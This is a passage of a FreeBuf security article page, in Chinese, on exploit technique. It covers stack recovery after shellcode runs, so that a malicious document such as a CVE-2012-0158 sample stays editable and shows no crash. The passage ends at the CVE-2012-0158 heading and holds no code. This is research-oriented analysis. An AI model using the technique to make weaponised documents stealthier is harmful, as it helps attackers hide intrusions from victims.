<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<!--
                              _.._        ,------------.
                           ,'      `.    ( We want you! )
                          /  __) __` \    `-,----------'
                         (  (`-`(-')  ) _.-'
                         /)  \  = /  (
                        /'    |--' .  \
                       (  ,---|  `-.)__`
                        )(  `-.,--'   _`-.
                       '/,'          (  Uu",
                        (_       ,    `/,-' )
                        `.__,  : `-'/  /`--'
                          |     `--'  |
                          `   `-._   /
                           \        (
                           /\ .      \.  freebuf
                          / |` \     ,-\
                         /  \| .)   /   \
                        ( ,'|\    ,'     :
                        | \,`.`--"/      }
                        `,'    \  |,'    /
                       / "-._   `-/      |
                       "-.   "-.,'|     ;
                      /        _/["---'""]
                     :        /  |"-     '
                     '           |      /
                                 `      |
-->
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>
  解读天书 &#8211; 漏洞利用中级技巧的分析 - FreeBuf.COM | 关注黑客与极客</title>
<meta name="description" content="本文作者夜未央以袁哥某篇微博为切入点，以实际的案列，详细介绍了漏洞利用中的一些原理的分析。" />
<meta name="keywords" content="CVE-2012-0158, events, 漏洞分析, 袁哥, 系统安全解决方案,系统安全软件排行,系统安全技术" />
<meta name="baidu-site-verification" content="nKKKqQxp6R" />
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="renderer" content="webkit">
<meta property="qc:admins" content="6620477777662552566375" />
<link rel='stylesheet' id='wpfp-css' href='http://www.freebuf.com/buf/plugins/wp-favorite-posts/wpfp.css' type='text/css' />
<link rel='stylesheet' id='wp-recentcomments-css'  href='http://static.3001.net/css/recentcomments/wp-recentcomments.css?ver=2.2.3' type='text/css' media='screen' />
<link rel='stylesheet' id='mycred-widget-css'  href='http://www.freebuf.com/buf/plugins/gold/assets/css/widget.css?ver=1.3.2.1' type='text/css' media='all' />
<script type='text/javascript' src='http://static.3001.net/js/header/jquery.min.js?ver=3.6.1'></script>
<script type='text/javascript' src='http://www.freebuf.com/buf/plugins/wp-favorite-posts/wpfp.js?ver=3.6.1'></script>
<link rel='prev' title='德国媒体：中国黑客去年曾向德国高官发送恶意电邮' href='http://www.freebuf.com/news/26417.html' />
<link rel='next' title='观点：传统安全企业发展趋势的二些看法' href='http://www.freebuf.com/articles/neopoints/26344.html' />
<link rel='canonical' href='http://www.freebuf.com/articles/system/26441.html' />
<link rel='shortlink' href='http://www.freebuf.com/?p=26441' />

<link rel="stylesheet" href="http://static.3001.net/css/highslide/highslide.css" type="text/css" />
<script type="text/javascript" src="http://static.3001.net/js/highslide/highslide-with-html.packed.js"></script>
<script type="text/javascript">
jQuery(document).ready(function($) {
    hs.graphicsDir = "http://www.freebuf.com/buf/plugins/auto-highslide/images/graphics/";
    hs.outlineType = "rounded-white";
    hs.dimmingOpacity = 0.8;
    hs.outlineWhileAnimating = true;
    hs.showCredits = false;
    hs.captionEval = "this.thumb.alt";
    hs.numberPosition = "caption";
    hs.align = "center";
    hs.transitions = ["expand", "crossfade"];
    hs.addSlideshow({
        interval: 5000,
        repeat: true,
        useControls: true,
        fixedControls: "fit",
        overlayOptions: {
            opacity: 0.75,
            position: "bottom center",
            hideOnMouseOut: true

        }

    });
});
</script>
          <script language="JavaScript" type="text/javascript" src="http://www.freebuf.com/buf/plugins/cartpauj-pm/js/script.js"></script>
      <link rel="stylesheet" type="text/css" href="http://www.freebuf.com/buf/plugins/cartpauj-pm/style/style.css" />
      <script type="text/javascript" src="http://www.freebuf.com/buf/plugins/simditor/highlight/highlight.pack.js"></script><link type="text/css" rel="stylesheet" href=" http://www.freebuf.com/buf/plugins/simditor/highlight/styles/default.css" />	<style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>
<link rel="shortcut icon" href="http://static.freebuf.com/images/favicon.ico" />
<link rel="stylesheet" href="http://static.3001.net/css/new/header.css" />
<link href="http://static.3001.net/css/new/bootstrap.min.css?ver=2016051701" rel="stylesheet" media="screen">
    <!--轮播图-->
    <link href="http://static.3001.net/css/new/swiper-3.4.2.min.css" rel="stylesheet" type="text/css">
    <link href="http://static.3001.net/css/new/style.css?ver=20170912568" rel="stylesheet" type="text/css">
    <style type="text/css">
#contenttxt hr {
  display: block;
  height: 0px;
  border: 0;
  border-top: 1px solid #ccc;
  margin: 15px 0;
  padding: 0;
}
#contenttxt table {
  width: 100%;
  table-layout: fixed;
  border-collapse: collapse;
  border-spacing: 0;
  margin: 15px 0;
}
#contenttxt table thead {
  background-color: #f9f9f9;
}
#contenttxt table td, #contenttxt table th {
  min-width: 40px;
  height: 30px;
  border: 1px solid #ccc;
  vertical-align: top;
  padding: 2px 4px;
  text-align: left;
  box-sizing: border-box;
  white-space: pre-wrap; white-space: -moz-pre-wrap; white-space: -pre-wrap; white-space: -o-pre-wrap; word-wrap: break-word;
}
#contenttxt table td.active, #contenttxt table th.active {
  background-color: #ffffee;
  white-space: pre-wrap; white-space: -moz-pre-wrap; white-space: -pre-wrap; white-space: -o-pre-wrap; word-wrap: break-word;
}
</style>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/jquery-2.0.3.min.js"></script>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/bootstrap.min.js"></script>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/slider.js?2016022501.1" type="text/javascript"></script>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/jquery.sticky.js" type="text/javascript"></script>
<script src="http://static.3001.net/js/focus/bjqs-1.3.min.js" type="text/javascript" ></script>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/mosaic.1.0.1.min.js" type="text/javascript" ></script>
<script type="text/javascript" src="http://static.3001.net/js/new/setint.js"></script>
    <!--轮播图-->
    <script src="http://static.3001.net/js/colum/swiper-3.4.2.min.js"></script>
<!--[if lt IE 9]>
    <script src="http://www.freebuf.com/buf/themes/freebuf/js/html5shiv.min.js"></script>
    <script src="http://www.freebuf.com/buf/themes/freebuf/js/respond.min.js"></script>
<![endif]-->
    <style>
        @font-face {font-family: 'iconfont';
            src: url('http://static.3001.net/iconfont/iconfont.eot'); /* IE9*/
            src: url('http://static.3001.net/iconfont/iconfont.eot?#iefix') format('embedded-opentype'), /* IE6-IE8 */
            url('http://static.3001.net/iconfont/iconfont.woff') format('woff'), /* chrome、firefox */
            url('http://static.3001.net/iconfont/iconfonticonfont.ttf') format('truetype'), /* chrome、firefox、opera、Safari, Android, iOS 4.2+*/
            url('http://static.3001.net/iconfont/iconfont.svg#iconfont') format('svg'); /* iOS 4.1- */
        }
    </style>
</head>

<body>
<!----------header---------->
<!--头部导航-->
<div id="undefined-sticky-wrapper" class="sticky-wrapper is-sticky">
    <div class="main-header">
        <div class="header">
            <div class="header-container clearfix">
                                <div class="header-logo"><a href="http://www.freebuf.com"></a></div>
                                        <!-- column -->
                        <div class="nav">
                            <ul class="nav-child clearfix">
                                <li class=" index">
                                    <a href="http://www.freebuf.com">首页</a></li>
                                <li data-value="read-menu">
                                    <a href="#">分类阅读<b class="triangle-down triangle-down-04"></b></a>
                                </li>
                                <li data-value="wenku-menu"><a href="javascript:;" target="_blank">文库<b class="triangle-down triangle-down-04"></b></a></li>
                                <li>
                                    <a href="http://zhuanlan.freebuf.com" target="_blank">专栏</a><b class="icon-betr"></b>
                                </li>
                                <li><a href="http://open.freebuf.com" target="_blank">公开课</a></li>
                                <li><a href="http://shop.freebuf.com" target="_blank">商城</a></li>
                                <li data-value="company-menu"><a href="javascript:;" >企业服务<b class="triangle-down triangle-down-04"></b></a></li>
                                <li data-value="user-menu"><a href="javascript:;" >用户服务<b class="triangle-down triangle-down-04"></b></a></li>
                            </ul>
                        </div>
                                        <div class="header-right">
                                    <div class="loginSign login-before">
                        <a href="https://account.tophant.com/register.html" class="login-btn">注册</a>
                        |
                        <a href="http://www.freebuf.com/oauth" class="sign-btn">登录</a>
                    </div>
                                    <!--搜索-->
                    <div class="search-form-inner clearfix">
                        <i class="searchdisplayico"></i>
                        <div class="form-group has-active search-col search-form-text">
                            <form id="hpsform-new" class="navbar-search navbar-form" onsubmit="return dispatch();">
                                <div class="form-group">
                                    <input id="bigq" class="input form-control" type="text" placeholder="关键字查找" autocomplete="off" title="关键字查找" name="q">
                                    <button class="submit" type="submit"></button>
                                </div>
                            </form>
                        </div>
                    </div>
                    <!--<script>
                        $('.search-form-inner .searchdisplayico').click(function(event) {
                            var evt = evt || event;
                            evt.stopPropagation();
                            $(this).siblings('.search-col').addClass('active');
                        });
                        $('.search-form-inner .search-col').click(function(event) {
                            var evt = evt || event;
                            evt.stopPropagation();
                            $('.search-form-inner .search-col').addClass('active');
                        });
                        $(document).click(function() {
                            $('.search-form-inner .search-col').removeClass('active');
                        });
                    </script>-->
                                    <div class="btn-publish">
                        <a href="#">投稿</a>
                        <div class="btn-publish-child">
                            <ul class="btn-child clearfix">
                                <li><a href="http://my.freebuf.com/post/edit/" target="_blank">文章撰写</a></li>
                                <li><hr/></li>
                                <li><a href="http://my.freebuf.com/post/article/" target="_blank">投稿管理</a></li>
                                                        </ul>
                        </div>
                    </div>
                </div>
                <div class="nav-small">
                    <a href="#">&#xe634;</a>
                    <ul class="nav-child clearfix">
                                                        <li class=" index">
                                    <a href="http://www.freebuf.com">首页</a></li>
                                <li class="read-classify">
                                    <a href="#">分类阅读<b class="icon-arrow"></b></a>
                                    <ul class="nav-child2 read-classify clearfix">
                                        <li>
                                            <strong>黑客</strong>
                                            <div class="nav-item">
                                                <a href="http://www.freebuf.com/vuls" target="_blank">漏洞</a>
                                                <a href="http://www.freebuf.com/sectool" target="_blank">安全工具</a>
                                                <a href="http://www.freebuf.com/articles/web" target="_blank">WEB安全</a>
                                                <a href="http://www.freebuf.com/articles/system" target="_blank">系统安全</a>
                                                <a href="http://www.freebuf.com/articles/network" target="_blank">网络安全</a>
                                                <a href="http://www.freebuf.com/articles/wireless" target="_blank">无线安全</a>
                                                <a href="http://www.freebuf.com/articles/terminal" target="_blank">设备/客户端安全</a>
                                                <a href="http://www.freebuf.com/articles/database" target="_blank">数据库安全</a>
                                                <a href="http://www.freebuf.com/articles/security-management" target="_blank">安全管理</a>
                                                <a href="http://www.freebuf.com/articles/es" target="_blank">企业安全</a>
                                                <a href="http://www.freebuf.com/ics-articles" target="_blank">工控安全</a>
                                            </div>
                                        </li>
                                        <li>
                                            <strong>极客</strong>
                                            <div class="nav-item">
                                                <a href="http://www.freebuf.com/geek" target="_blank">极客有意思</a>
                                                <a href="http://www.freebuf.com/news/others" target="_blank">周边</a>
                                            </div>
                                        </li>
                                        <li>
                                            <strong>特色</strong>
                                            <div class="nav-item">
                                                <a href="http://www.freebuf.com/news/special" target="_blank">头条</a>
                                                <a href="http://www.freebuf.com/articles/people" target="_blank">人物志</a>
                                                <a href="http://www.freebuf.com/fevents" target="_blank">活动</a>
                                                <a href="http://www.freebuf.com/video" target="_blank">视频</a>
                                                <a href="http://www.freebuf.com/articles/neopoints" target="_blank">观点</a>
                                                <a href="http://www.freebuf.com/jobs" target="_blank">招聘</a>
                                                <a href="http://www.freebuf.com/paper/" target="_blank">报告</a>
                                            </div>
                                        </li>
                                    </ul>
                                </li>
                                <li><a href="http://zhuanlan.freebuf.com/" target="_blank">专栏</a></li>
                                <li><a href="http://open.freebuf.com" target="_blank">公开课</a></li>
                                <li><a href="http://shop.freebuf.com" target="_blank">商城</a></li>
                                <li>
                                    <a href="javascript:;" target="_blank">企业服务<b class="icon-arrow"></b></a>
                                    <ul class="nav-child2">
                                        <li>
                                            <a href="https://www.vulbox.com/bounties/item-9-0-1" target="_blank"><strong>企业SRC</strong></a>
                                        </li>
                                        <li>
                                            <a href="http://company.freebuf.com" target="_blank"><strong>企业空间</strong></a>
                                        </li>
                                        <li>
                                            <a href="https://www.vulbox.com/" target="_blank"><strong>安全测试</strong></a>
                                        </li>
                                        <li>
                                            <a href="https://www.riskivy.com/" target="_blank"><strong>风险感知</strong></a>
                                        </li>

                                    </ul>
                                </li>
                                <li>
                                    <a href="javascript:;" target="_blank">用户服务<b class="icon-arrow"></b></a>
                                    <ul class="nav-child2">
                                        <li>
                                            <a href="http://www.freebuf.com/newsend" target="_blank"><strong>有奖投稿</strong></a>
                                        </li>
                                        <li>
                                            <a href="http://zhuanlan.freebuf.com" target="_blank">
                                        </li>
                                        <li>
                                            <a href="https://www.vulbox.com/bounties/detail-72" target="_blank"><strong>提交漏洞</strong></a>
                                        </li>
                                        <li class="last">
                                            <a href="https://www.vulbox.com/bounties" target="_blank"><strong>参与众测</strong></a>
                                        </li>
                                    </ul>
                                </li>
                                <li>
                                    <a href="javascript:;" target="_blank">文库<b class="icon-arrow"></b></a>
                                    <ul class="nav-child2">
                                        <li>
                                            <a href="http://www.freebuf.com/wenku" target="_blank"><strong>文库</strong></a>
                                        </li>
                                        <li>
                                            <a href="http://www.freebuf.com/special-subject" target="_blank"><strong>专题</strong></a>
                                        </li>
                                    </ul>
                                </li>
                                                    <li><a href="http://my.freebuf.com/post/edit" target="_blank">投稿</a></li>
                                                    <li><a href="https://account.tophant.com/register.html" class="login-btn">注册</a>
                            </li>
                            <li><a href="http://www.freebuf.com/oauth" class="sign-btn">登录</a></li>
                                            </ul>
                </div>
            </div>
            <div class="dropdown-menu read-menu" id="read-menu">
                <div class="container">
                    <ul class="menu clearfix">
                        <li>
                            <strong>黑客</strong>
                            <div class="nav-item">
                                <a href="http://www.freebuf.com/vuls" target="_blank">漏洞</a>
                                <a href="http://www.freebuf.com/sectool" target="_blank">安全工具</a>
                                <a href="http://www.freebuf.com/articles/web" target="_blank">WEB安全</a>
                                <a href="http://www.freebuf.com/articles/system" target="_blank">系统安全</a>
                                <a href="http://www.freebuf.com/articles/network" target="_blank">网络安全</a>
                                <a href="http://www.freebuf.com/articles/wireless" target="_blank">无线安全</a>
                                <a href="http://www.freebuf.com/articles/terminal" target="_blank">设备/客户端安全</a>
                                <a href="http://www.freebuf.com/articles/database" target="_blank">数据库安全</a>
                                <a href="http://www.freebuf.com/articles/security-management" target="_blank">安全管理</a>
                                <a href="http://www.freebuf.com/articles/es" target="_blank">企业安全</a>
                                <a class="last" href="http://www.freebuf.com/ics-articles" target="_blank">工控安全</a>
                            </div>
                        </li>
                        <li>
                            <strong>极客</strong>
                            <div class="nav-item">
                                <a href="http://www.freebuf.com/geek" target="_blank">极客有意思</a>
                                <a class="last" href="http://www.freebuf.com/news/others" target="_blank">周边</a>
                            </div>
                        </li>
                        <li>
                            <strong>特色</strong>
                            <div class="nav-item">
                                <a href="http://www.freebuf.com/news/special" target="_blank">头条</a>
                                <a href="http://www.freebuf.com/articles/people" target="_blank">人物志</a>
                                <a href="http://www.freebuf.com/fevents" target="_blank">活动</a>
                                <a href="http://www.freebuf.com/video" target="_blank">视频</a>
                                <a href="http://www.freebuf.com/articles/neopoints" target="_blank">观点</a>
                                <a href="http://www.freebuf.com/jobs" target="_blank">招聘</a>
                                <a class="last" href="http://www.freebuf.com/paper/" target="_blank">报告</a>
                            </div>
                        </li>
                    </ul>
                </div>
            </div>
            <div class="dropdown-menu company-menu" id="company-menu">
                <div class="container">
                    <ul class="menu">
                        <li>
                            <a href="https://www.vulbox.com/bounties/item-9-0-1" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-src.png"></span>
                                <span class="name">企业SRC</span>
                                <span class="intro">全/半托管式互联网漏洞收集管理</span>
                            </a>
                        </li>
                        <li>
                            <a href="http://company.freebuf.com" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-company.png"></span>
                                <span class="name">企业空间</span>
                                <span class="intro">为企业定制信息安全专属门户</span>
                            </a>
                        </li>
                        <li>
                            <a href="https://www.vulbox.com/" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-safety.png"></span>
                                <span class="name">安全测试</span>
                                <span class="intro">国内领先的互联网安全众测服务</span>
                            </a>
                        </li>
                        <li class="last">
                            <a href="https://www.riskivy.com/" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-risk.png"></span>
                                <span class="name">风险感知</span>
                                <span class="intro">基于IT资产的自动化安全监控</span>
                            </a>
                        </li>

                    </ul>
                </div>
            </div>
            <div class="dropdown-menu user-menu" id="user-menu">
                <div class="container">
                    <ul class="menu">
                        <li>
                            <a href="http://www.freebuf.com/newsend" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-write.png"></span>
                                <span class="name">有奖投稿</span>
                                <span class="intro">与整个行业分享你的经验与见解</span>
                            </a>
                        </li>
                        <li>
                            <a href="http://zhuanlan.freebuf.com" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-column.png"></span>
                                <span class="name">申请专栏</span>
                                <span class="intro">自由创作，打造自主内容品牌</span>
                            </a>
                        </li>
                        <li>
                            <a href="https://www.vulbox.com/bounties/detail-72" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-leak.png"></span>
                                <span class="name">提交漏洞</span>
                                <span class="intro">与数万白帽一起，让互联网更安全</span>
                            </a>
                        </li>
                        <li class="last">
                            <a href="https://www.vulbox.com/bounties" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-test.png"></span>
                                <span class="name">参与众测</span>
                                <span class="intro">挖洞开启自由职业之路</span>
                            </a>
                        </li>
                    </ul>
                </div>
            </div>
            <div class="dropdown-menu wenku-menu" id="wenku-menu">
                <div class="container">
                    <ul class="menu">
                        <li>
                            <a href="http://www.freebuf.com/wenku" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-write.png"></span>
                                <span class="name">文库</span>
                                <span class="intro">最全的FB百科</span>
                            </a>
                        </li>
                        <li class="last">
                            <a href="http://www.freebuf.com/special-subject" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-test.png"></span>
                                <span class="name">专题</span>
                                <span class="intro">浓缩的安全精华汇总</span>
                            </a>
                        </li>
                    </ul>
                </div>
            </div>
        </div>
    </div>
</div>
<!----------header end---------->
<!--<script type="application/javascript">
    var  _value_tab = '';
    $(function(){
        var _that = '', _show_flag = 0;
        $('.header .header-container .nav .nav-child > li:not(input[data-value])').mouseover(function() {
            $('.header .dropdown-menu').stop().slideUp(50);
        });
        $('.header').mouseout(function() {
            $('.header .dropdown-menu').stop().slideUp(50);
        });
        /*$('.header .header-container .nav .nav-child > li').mouseover(function() {
         _value_tab = $(this).attr('data-value');
         $('#'+_value_tab).siblings('.dropdown-menu').stop().slideUp(50);
         $('#'+_value_tab).stop().slideDown(100);
         });*/
        $(".header .header-container .nav .nav-child > li").hoverDelay({
            hoverDuring: 500,
            hoverEvent: function(){
                $('#'+_value_tab).siblings('.dropdown-menu').stop().slideUp(50);
                $('#'+_value_tab).stop().slideDown(100);
            }
        });
        $('.header .dropdown-menu').mouseover(function() {
            _value_tab = $(this).attr('id');
            _that = this;
            $('.nav-child li[data-value="'+_value_tab+'"]').addClass('hover');
            $(this).stop().slideDown(50);
        }).mouseout(function() {
            $('.nav-child li[data-value="'+_value_tab+'"]').removeClass('hover');
            $(_that).stop().slideUp(50);
        });

        $(".nav-small .nav-child > li").click(function(event){
            var ev = ev || event;
            ev.stopPropagation();

            if($(this).find('.nav-child2').is(":hidden")) {
                _show_flag = 1;
                $(this).find('.nav-child2').slideDown();
                $(this).find('.icon-arrow').addClass('bottom');
            }else {
                _show_flag = 0;
                $(this).find('.nav-child2').slideUp();
                $(this).find('.icon-arrow').removeClass('bottom');
            }
            $(this).siblings().find('.nav-child2').slideUp();
            $(this).siblings().find('.icon-arrow').removeClass('bottom');
        });
        //头部投稿按钮hover状态展开菜单
        $(".btn-publish-child > ul > li").hover(function(){
            $(this).addClass("active");
            $(this).siblings().removeClass("active");
        });

        $(document).click(function(event){
            var ev = ev || event;
            $(".login-after").find(".login-after-child").hide();
        });
        //点击用户信息，出现下拉菜单
        $("#user-info").click(function(event){
            var ev = ev || event;
            ev.stopPropagation();
            $(".login-after").find(".login-after-child").toggle();
        });
        //顶部导航
        $(".nav-small").click(function(){
            $(this).find(".nav-child").slideToggle();
        });
        var that = '';
        $('.header .header-container .nav .nav-child > li').mouseover(function() {
            that = this;
            $(this).find('.dropdown-menu').stop().slideDown(200);
        }).mouseout(function() {
            $(that).find('.dropdown-menu').stop().slideUp(200);
        });
    });
    $(".nav-small .nav-child > li").click(function(event){
        var ev = ev || event;
        ev.stopPropagation();
        $(this).siblings('li').find('.dropdown-menu').hide();
        $(this).find(".dropdown-menu").toggle();
    });
    //鼠标经过(hover)事件的延时处理
    (function($){
        $.fn.hoverDelay = function(options){
            var defaults = {
                hoverDuring: 100,
                outDuring: 100,
                hoverEvent: function(){
                    $.noop();
                },
                outEvent: function(){
                    $.noop();
                }
            };
            var sets = $.extend(defaults,options || {});
            var hoverTimer, outTimer;
            return $(this).each(function(){
                $(this).hover(function(){
                    _value_tab = $(this).attr('data-value');
                    clearTimeout(outTimer);
                    hoverTimer = setTimeout(sets.hoverEvent, sets.hoverDuring);
                },function(){
                    clearTimeout(hoverTimer);
                    outTimer = setTimeout(sets.outEvent, sets.outDuring);
                });
            });
        }
    })(jQuery);
</script>-->
<script type="text/javascript" src="http://static.3001.net/js/header/header.js"></script><script>
    jQuery(window).load(function(){
      if(jQuery(window).width()>480){
        jQuery(".main-header").sticky({ topSpacing: 0 });
      }else{
        jQuery(".main-header nav").removeClass("navbar-fixed-top");
      }
      jQuery("#mar-right").sticky({ topSpacing: 105,bottomSpacing: 410 });
    });
</script>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/layer.js"></script>
<script type="text/javascript" src="http://static.3001.net/js/pretty/prettify.js"></script>
<script type="text/javascript" src="http://static.3001.net/js/header/lazyload.js"></script>
<script type="text/javascript" charset="utf-8">
      jQuery(function() {
          jQuery("img").lazyload({
              effect : "fadeIn"
          });
      });
 </script>
<script type="text/javascript">
    window.onload = function(){
        prettyPrint();
    }
</script>
<script language="JavaScript" type="text/javascript">
//<![CDATA[
var va = "您已经点亮过了";
function acv_vote(id,option, m){
  if( m==null) m =''; m = m + '';
  jQuery('#acv_stat_'+m+id).html('Loading...');
  var url="http://www.freebuf.com/index.php?acv_ajax=true&option="+option+"&ID="+id;
  jQuery.get(url,function(d){
    d =d.split('|');var s='#acv_stat_'+m+d[0];
    var sele = '#cos_support-'+m+id,unsele = '#cos_unsupport-'+m+id,tpjs = 'javascript:alert(va)';
    jQuery( s ).html( d[1] );jQuery(s).fadeOut(400,function(){jQuery(s).fadeIn();});
    if( d[2] == 1 ){ jQuery(sele).html(jQuery(sele).html()*1+1); }
    if( d[2] == -1 ){ jQuery(unsele).html(jQuery(unsele).html()*1+1); }
    jQuery('#vote4-'+id).attr('href',tpjs);jQuery('#vote4-2'+id).attr('href',tpjs);
    jQuery('#votea-'+id).attr('href',tpjs);jQuery('#votea-2'+id).attr('href',tpjs);
  });
}
  
$(document).on("mouseenter",".comment-tools",function(){
  $(this).find(".btn-report").show();
  $(this).find(".btn-report").addClass("hover");
}).on("mouseleave",".comment-tools",function(){
  var $_this = $(this);
  $(this).find(".btn-report").removeClass("hover");
  if(!$(this).find(".dropup").hasClass('open')){
    $(this).find(".btn-report").hide(); 
    $_this.find(".dropdown-menu").css("display","none");
  }else{
    setTimeout(function(){
      if(!$_this.find(".btn-report").hasClass("hover")){
        $_this.find(".dropup").removeClass("open");
        $_this.find(".dropdown-menu").css("display","none");
        $_this.find(".btn-report").hide(); 
      }
    },"500");
  }
})

$(document).on("click",".click_report",function(){
  $(this).parent().parent().css("display","none");
  var id = $(this).attr("data-id");
  var url="http://www.freebuf.com/index.php?acv_ajax=true&option=0&ID="+id;
  $_this = $(this);
  jQuery.get(url,function(d){
    d =d.split('|');
    if(d[1]=='您已经点过灯了'){
      d[1] = '您已经举报过了';
    }
    if(d[1]=='Thank you'){
      d[1] = '举报成功';
    }
    $_this.parent().parent().parent().find(".btn-report").text(d[1]);
    $_this.parent().parent().parent().find(".btn-report").css("display","block");
  })
})

$(document).on("click",".btn-report",function(){
  if($(this).parent().hasClass('open')){
    $(this).parent().find(".dropdown-menu").css("display","block");
  }else{
    $(this).parent().find(".dropdown-menu").css("display","none");
  }
})
//]]>
</script>
<div class="column-article" data-column="">
            <div class="container pad-top35">
        <div class="row clearfix">
            <div class="col-md-9" id="getWidth">
                                    <div class="reletive search-xs-wrap">
                    <div class="form-group has-active search-col search-xs">
                        <form id="hpsform-new" class="navbar-search navbar-form" onsubmit="return dispatch()">
                            <div class="form-group">
                                <input id="q" class="input form-control" type="text" placeholder="关键字查找" autocomplete="off" title="关键字查找" name="q">
                                <button class="submit" type="submit"></button>
                            </div>
                        </form>
                    </div>
                </div>
                    <script type="text/javascript">
                        var dispatch = function () {
                            console.log(123)
                            var q = document.getElementById("q");
                            if (q.value == "") {
                                q = document.getElementById("bigq");
                            }
                            if (q.value != "") {
                                window.open('http://www.freebuf.com/?s=' + q.value, "_blank");
                                return false;
                            } else {
                                return false;
                            }
                        }
                    </script>
                                <div class="article-wrap panel panel-default">
                                                            <div class="articlecontent">
                                                    <div class="title">
                                <h2>
                                    解读天书 &#8211; 漏洞利用中级技巧的分析                                </h2>
                                <div class="property">
                                                                            <span class="name"><a href="http://www.freebuf.com/author/%e5%a4%9c%e6%9c%aa%e5%a4%ae" title="由 夜未央 发布" rel="author">夜未央</a></span>
                                                                        <span class="icon-f"></span>
                                    <span class="time">2014-02-19</span>
                                                                                                                    <img style="float: left;margin-top:2px;" title="金币奖励" src="http://image.3001.net/images/other/gold.png"/>
                                        <span class="coin"><strong>+20</strong></span>
                                                                                                            <span class="look">共<strong>353135</strong>人围观
                                        ，发现 <strong>52</strong> 个不明物体 </span>                                      </span>
                                                                <span class="tags">
                                      <a href="http://www.freebuf.com/./articles/system">系统安全</a></span>
                                    <span class="tags_01"></span>
                                </div>
                            </div>
                                                                                                <div id="contenttxt">
                            <p><span style="color: rgb(38, 38, 38); font-size: 20px;"><strong>题记:</strong></span></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;<span style="color: rgb(38, 38, 38);"><strong>距离上次更新感觉已经过了很久很久的时间，什么事情多时间少都是借口，自己变的懒了倒是真的，给大家道歉，以后更新会加快的，今天不讲漏洞分析，跟我来讨论下漏洞利用中的一些原理上的分析。本篇文章遵循思考问题-分析问题-解决问题的过程，以符合大家的思路，Let’s go!</strong></span></p>
<p><span style="color: rgb(38, 38, 38); font-size: 20px;"><strong>0&#215;1&nbsp;起因</strong></span></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;江湖上一直流传着<a href="http://weibo.com/yuange1975" target="_blank" title="" data_ue_src="http://weibo.com/yuange1975">袁哥（yuange1975）</a>的传说，发表的很多文章和微博自己从来都是当做天书来看，毕竟有些知识确实是我这等小菜无法理解和掌握的，只能深深的膜拜。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;某天袁哥就发了如下的2篇微博：</p>
<p style="text-align:center"><img data-original="http://image.3001.net/images/20140218/1392731254130.jpg!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" title="1.jpg"/></p>
<noscript><img src="http://image.3001.net/images/20140218/1392731254130.jpg!small" title="1.jpg"/></p></noscript>
<p style="text-align: center;">图(1)：袁哥微博截图</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;像什么APT、种马（貌似有歧义）、文件系统格式嵌入等等概念因为离自己太过遥远不去管它，真正比较敢兴趣的是“文件可正常编辑，编辑后溢出种马还一切正常”，“怎么用简单技术办法修复堆内存结构”，平时做的都是分析分析再分析，像袁哥说的那样还是真的没有想象过，但如果真如他所说，确实非常的有趣，虽然我真的不懂，但看起来很厉害的样子。看完袁哥的微博，这些东西就一直在脑子中盘旋，这到底是怎样的一种情形，又如何去做到，有没有实际一点的例子，最后实在是手痒的紧，太想见识一下传说中的不弹、不闪、不卡的真面目，于是就有了此篇文章。</p>
<p><span style="color: rgb(38, 38, 38); font-size: 20px;"><strong>0&#215;2&nbsp;分析及验证过程</strong></span></p>
<p><span style="font-size: 16px;"><strong><span style="color: rgb(38, 38, 38);">0&#215;2.1 一些思考</span></strong></span></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;这些思考都是在实际调试之前自己想要弄明白的，不然当真是无从下手，这时确定目标的过程。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;什么是“文件可正常编辑”？</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;前提条件是不影响漏洞的触发，首先要利用一个漏洞必须要保证漏洞能够在对应的软件版本平台上正常触发，之后再来文件能否正常编辑的问题，一般的漏洞样本是文件打开-闪一下-弹出了一个正常文档，这样的情况下文档处理程序是退出了的，然后再重新启动一个新的进程，原始样本肯定是不可能做到可编辑。关键点是在哪里呢？一番思考之后找到了关键：漏洞触发之后堆栈恢复（附注(1)(2)）。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;如何做到堆栈恢复？</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;我们知道漏洞触发之后接着执行的就是ShellCode，即ShellCode接管了程序的执行流程，ShellCode主体功能执行之后呢，一般做法就是退出了，如果在ShelLCode主体功能执行之后，接着进行堆栈的恢复，若是成功，相当于交回了程序执行流程，即进程继续“正确”的执行流程，自然文档是可以正常编辑。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;明白了文件可正常编辑是如何一个原理，接下来就是实际操作：</p>
<p><span style="color: rgb(38, 38, 38); font-size: 16px;"><strong>0&#215;2.2 选择CVE-2012-0158</strong></span></p>
